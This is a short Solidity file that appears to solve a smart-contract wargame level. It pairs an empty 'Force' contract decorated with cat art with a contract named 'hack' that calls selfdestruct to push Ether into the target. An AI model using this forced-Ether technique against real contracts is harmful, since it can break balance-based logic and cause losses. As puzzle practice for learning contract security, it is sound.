// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}

contract hack {
Force target;
    constructor(address _address)  {
        target = Force(_address);
    }

    function kill() public {
        selfdestruct(payable(address(target)));
    }

    receive() external payable {}

}